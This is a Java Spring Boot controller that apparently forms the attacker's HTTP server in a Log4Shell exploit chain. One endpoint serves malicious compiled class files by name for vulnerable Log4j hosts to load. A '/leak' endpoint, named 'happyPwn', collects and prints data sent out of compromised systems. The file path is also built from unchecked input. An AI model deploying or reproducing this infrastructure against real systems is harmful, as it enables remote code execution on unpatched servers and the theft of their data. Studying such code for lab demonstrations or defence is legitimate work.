package dev.babebbu.log4shell.exploit.http;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Map;

@RestController
public class ExploitController {

    @GetMapping("/{className}")
    public byte[] exploit(@PathVariable String className) throws IOException {
        System.out.println("Requesting Class: " + className); // className will have .class suffix
        return Files.readAllBytes(Paths.get(Path.of("").toAbsolutePath().toString() + "/src/main/resources/templates/" + className));
    }
    
    /**
     * For retrieving leaking data in JsonFormat {data: "..."}
     * @param request LeakDataJsonRequest
     * @return ResponseEntity
     */
    @PostMapping("/leak")
    public ResponseEntity<?> happyPwn(@RequestBody LeakDataJsonRequest request) {
        System.out.println(request.getData());
        return ResponseEntity.noContent().build();
    }

}
